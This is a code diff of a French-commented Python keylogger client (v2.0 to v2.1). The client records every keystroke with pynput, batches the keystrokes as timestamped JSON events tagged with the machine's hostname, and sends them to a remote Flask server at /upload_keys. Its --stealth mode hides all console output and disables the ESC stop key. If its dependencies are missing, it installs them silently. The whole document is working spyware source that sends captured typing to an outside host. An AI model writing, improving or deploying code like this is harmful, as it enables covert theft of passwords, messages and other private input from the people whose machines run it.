@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 """
-Keylogger Client v2.0 - Version corrigée
-Envoie les frappes vers le serveur Flask
+Keylogger Client v2.1 - Version structurée
+
+- Capture les frappes avec pynput
+- Envoie des événements structurés JSON au serveur Flask
 """
+
 import sys
-import json
 import time
-from datetime import datetime
 import socket
 import subprocess
 
@@ -15,10 +16,10 @@ try:
     from pynput import keyboard
     import requests
 except ImportError:
-    print("[!] Installation des dépendances...")
+    print("[!] Installation des dépendances (pynput, requests)...")
     try:
         subprocess.check_call([
-            sys.executable, "-m", "pip", "install", 
+            sys.executable, "-m", "pip", "install",
             "--break-system-packages", "-q", "pynput", "requests"
         ])
         from pynput import keyboard
@@ -29,184 +30,229 @@ except ImportError:
         print("[!] Installez manuellement: pip3 install --break-system-packages pynput requests")
         sys.exit(1)
 
+
 class KeyloggerClient:
-    def __init__(self, server_url, api_key, stealth=False):
-        self.server_url = server_url.rstrip('/')
+    def __init__(self, server_url: str, api_key: str, stealth: bool = False):
+        self.server_url = server_url.rstrip("/")
         self.api_key = api_key
         self.stealth = stealth
+
+        # Buffer d'événements structurés
+        # Chaque élément est un dict: {"t": timestamp, "k": "char"/"special", "v": valeur}
         self.buffer = []
-        self.buffer_size = 20  # Envoyer toutes les 20 frappes (augmenté)
+        self.buffer_size = 50          # Nombre max d'événements avant envoi
         self.last_send = time.time()
-        self.send_interval = 3  # Ou toutes les 3 secondes (réduit)
-        self.send_lock = False  # Empêcher les envois simultanés
-        
-        # Identifier la machine
+        self.send_interval = 3         # Envoi max toutes les 3 secondes
+        self.send_lock = False
+
+        # Identifiant machine
         self.machine_id = socket.gethostname()
-        
+
         if not self.stealth:
-            print(f"[✓] Keylogger démarré")
-            print(f"[✓] Machine: {self.machine_id}")
-            print(f"[✓] Serveur: {self.server_url}")
-            print(f"[✓] Mode: {'Stealth' if stealth else 'Debug'}")
-    
+            print("[✓] Keylogger démarré")
+            print(f"[✓] Machine : {self.machine_id}")
+            print(f"[✓] Serveur : {self.server_url}")
+            print(f"[✓] Mode    : {'Stealth' if stealth else 'Debug'}")
+
+    # ------------------------------------------------------------------ #
+    #    ENVOI AU SERVEUR
+    # ------------------------------------------------------------------ #
     def send_keys(self):
-        """Envoie les touches vers le serveur"""
+        """Envoie le buffer d'événements au serveur."""
         if not self.buffer or self.send_lock:
             return
-        
-        self.send_lock = True  # Verrouiller pendant l'envoi
-        
+
+        self.send_lock = True
+        events_to_send = self.buffer
+        self.buffer = []
+
         try:
-            # Copier et vider le buffer immédiatement
-            logs_to_send = "".join(self.buffer)
-            self.buffer = []
-            
             payload = {
                 "machine": self.machine_id,
-                "logs": logs_to_send
+                "api_key": self.api_key,
+                "events": events_to_send,
             }
-            
             headers = {
                 "Content-Type": "application/json",
-                "User-Agent": "KeyloggerClient/2.0"
+                "User-Agent": "KeyloggerClient/2.1",
             }
-            
-            response = requests.post(
+
+            resp = requests.post(
                 f"{self.server_url}/upload_keys",
                 json=payload,
                 headers=headers,
-                timeout=10
+                timeout=10,
             )
-            
-            if response.status_code == 200:
+
+            if resp.status_code == 200:
                 if not self.stealth:
-                    print(f"\n[✓] {len(logs_to_send)} touches envoyées")
+                    print(f"\n[✓] {len(events_to_send)} événements envoyés")
             else:
                 if not self.stealth:
-                    print(f"\n[✗] Erreur serveur: {response.status_code}")
-                # Remettre dans le buffer en cas d'erreur
-                self.buffer = list(logs_to_send) + self.buffer
-        
+                    print(f"\n[✗] Erreur serveur: HTTP {resp.status_code}")
+                # On remet dans le buffer pour retenter plus tard
+                self.buffer = events_to_send + self.buffer
+
         except requests.exceptions.RequestException as e:
             if not self.stealth:
-                print(f"\n[✗] Erreur connexion: {e}")
-            # Remettre dans le buffer
-            self.buffer = list(logs_to_send) + self.buffer
+                print(f"\n[✗] Erreur de connexion: {e}")
+            self.buffer = events_to_send + self.buffer
+
         except Exception as e:
             if not self.stealth:
-                print(f"\n[✗] Erreur inattendue: {e}")
+                print(f"\n[✗] Erreur inattendue pendant l'envoi: {e}")
+            self.buffer = events_to_send + self.buffer
+
         finally:
             self.send_lock = False
-    
-    def on_press(self, key):
-        """Callback appelé à chaque touche pressée"""
-        try:
-            # Touches normales
-            if hasattr(key, 'char') and key.char:
-                char = key.char
-            # Touches spéciales
+
+    # ------------------------------------------------------------------ #
+    #    GESTION DU BUFFER
+    # ------------------------------------------------------------------ #
+    def _add_event(self, kind: str, value: str):
+        """
+        Ajoute un événement au buffer.
+        kind: "char" ou "special"
+        value: caractère ou nom de touche
+        """
+        evt = {
+            "t": time.time(),
+            "k": kind,
+            "v": value,
+        }
+        self.buffer.append(evt)
+
+        # Affichage console en mode debug
+        if not self.stealth:
+            if kind == "char":
+                # Pour bien voir les entrées
+                to_show = value
+                if value == "\n":
+                    to_show = "\\n"
+                elif value == "\t":
+                    to_show = "\\t"
+                print(to_show, end="", flush=True)
             else:
-                key_name = str(key).replace('Key.', '')
-                
-                # Liste des touches à IGNORER complètement
-                ignore_keys = [
-                    'shift', 'shift_r', 'shift_l',
-                    'ctrl', 'ctrl_r', 'ctrl_l',
-                    'alt', 'alt_r', 'alt_l', 'alt_gr',
-                    'cmd', 'cmd_r', 'cmd_l',
-                    'caps_lock', 'fn',
-                    'up', 'down', 'left', 'right',
-                    'home', 'end', 'page_up', 'page_down',
-                    'insert', 'print_screen', 'pause',
-                    'f1', 'f2', 'f3', 'f4', 'f5', 'f6',
-                    'f7', 'f8', 'f9', 'f10', 'f11', 'f12'
-                ]
-                
-                if key_name in ignore_keys:
-                    return  # Ne pas enregistrer ces touches
-                
-                # Mapping des touches à garder
-                special_map = {
-                    'space': ' ',
-                    'enter': '\n',
-                    'tab': '\t',
-                    'backspace': '[⌫]',
-                    'delete': '[DEL]',
-                    'esc': '[ESC]',
-                }
-                
-                char = special_map.get(key_name, f'[{key_name.upper()}]')
-            
-            # Ajouter au buffer
-            if char:
-                self.buffer.append(char)
-                
-                if not self.stealth:
-                    print(f"[KEY] {char}", end='', flush=True)
-            
-            # Envoyer si buffer plein ou timeout
-            current_time = time.time()
-            if (len(self.buffer) >= self.buffer_size or 
-                current_time - self.last_send >= self.send_interval):
-                self.send_keys()
-                self.last_send = current_time
-        
+                print(f"[{value}]", end="", flush=True)
+
+        # Conditions d'envoi
+        now = time.time()
+        if len(self.buffer) >= self.buffer_size or (now - self.last_send) >= self.send_interval:
+            self.send_keys()
+            self.last_send = now
+
+    # ------------------------------------------------------------------ #
+    #    CALLBACKS PYNPUT
+    # ------------------------------------------------------------------ #
+    def on_press(self, key):
+        """Appelé à chaque pression de touche."""
+        try:
+            # Cas des caractères imprimables
+            if hasattr(key, "char") and key.char is not None:
+                # key.char peut être déjà un caractère unicode correct
+                self._add_event("char", key.char)
+                return
+
+            # Cas des touches spéciales
+            key_name = str(key).replace("Key.", "")
+
+            # Touches complètement ignorées
+            ignore = {
+                "shift", "shift_r", "shift_l",
+                "ctrl", "ctrl_r", "ctrl_l",
+                "alt", "alt_r", "alt_l", "alt_gr",
+                "cmd", "cmd_r", "cmd_l",
+                "caps_lock", "fn",
+                "up", "down", "left", "right",
+                "home", "end", "page_up", "page_down",
+                "insert", "print_screen", "pause",
+                "num_lock", "scroll_lock",
+                "f1", "f2", "f3", "f4", "f5", "f6",
+                "f7", "f8", "f9", "f10", "f11", "f12",
+            }
+            if key_name in ignore:
+                return
+
+            # Mapping des touches spéciales utiles
+            special_map = {
+                "space": " ",
+                "enter": "\n",
+                "tab": "\t",
+                "backspace": "BACKSPACE",
+                "delete": "DEL",
+                "esc": "ESC",
+            }
+
+            if key_name in special_map:
+                mapped = special_map[key_name]
+                # Les vraies séparations de texte restent en "char"
+                if mapped in (" ", "\n", "\t"):
+                    self._add_event("char", mapped)
+                else:
+                    # Les contrôles (backspace, etc.) restent distincts
+                    self._add_event("special", mapped)
+            else:
+                # Autre touche spéciale (ex: "media_play_pause", etc.)
+                self._add_event("special", key_name.upper())
+
         except Exception as e:
             if not self.stealth:
                 print(f"\n[✗] Erreur capture: {e}")
-    
+
     def on_release(self, key):
-        """Callback appelé au relâchement d'une touche"""
-        # ESC pour arrêter (seulement en mode debug)
+        """Appelé au relâchement d'une touche."""
+        # ESC pour arrêter uniquement en mode debug
         if not self.stealth and key == keyboard.Key.esc:
             print("\n[!] Arrêt demandé (ESC)")
             return False
-    
+
+    # ------------------------------------------------------------------ #
+    #    BOUCLE PRINCIPALE
+    # ------------------------------------------------------------------ #
     def start(self):
-        """Démarre l'écoute du clavier"""
+        """Démarre l'écoute du clavier."""
         if not self.stealth:
             print("[!] Appuyez sur ESC pour arrêter en mode debug")
             print("-" * 50)
-        
+
+        # Petit ping serveur (optionnel)
         try:
-            # Test de connexion
-            response = requests.get(
-                f"{self.server_url}/api/ping",
-                timeout=5
-            )
-            if response.status_code == 200:
-                if not self.stealth:
+            r = requests.get(f"{self.server_url}/api/ping", timeout=5)
+            if not self.stealth:
+                if r.status_code == 200:
                     print("[✓] Connexion au serveur OK")
-            else:
-                if not self.stealth:
-                    print(f"[!] Serveur répond avec code {response.status_code}")
+                else:
+                    print(f"[!] Serveur répond avec code {r.status_code}")
         except Exception as e:
             if not self.stealth:
-                print(f"[!] Avertissement: Impossible de joindre le serveur")
+                print("[!] Impossible de joindre le serveur (buffer local)")
                 print(f"    Erreur: {e}")
-                print("[!] Les données seront mises en buffer")
-        
-        # Démarrer l'écoute
+
+        # Démarrage de l'écoute
         with keyboard.Listener(
             on_press=self.on_press,
             on_release=self.on_release
         ) as listener:
             listener.join()
-        
-        # Envoyer les données restantes
+
+        # A la fin, envoie le reste
         if self.buffer:
             self.send_keys()
 
+
+# ---------------------------------------------------------------------- #
+#    MAIN
+# ---------------------------------------------------------------------- #
 def main():
     if len(sys.argv) < 3:
         print("Usage: python3 keylogger_client_v2.py <SERVER_URL> <API_KEY> [--stealth]")
-        print("Exemple: python3 keylogger_client_v2.py https://keylog.claverie.site API_KEY")
+        print("Exemple: python3 keylogger_client_v2.py https://keylog.claverie.site MON_API_KEY --stealth")
         sys.exit(1)
-    
+
     server_url = sys.argv[1]
     api_key = sys.argv[2]
     stealth = "--stealth" in sys.argv
-    
+
     try:
         client = KeyloggerClient(server_url, api_key, stealth)
         client.start()
@@ -217,5 +263,7 @@ def main():
         print(f"\n[✗] Erreur fatale: {e}")
         sys.exit(1)
 
+
 if __name__ == "__main__":
     main()
+
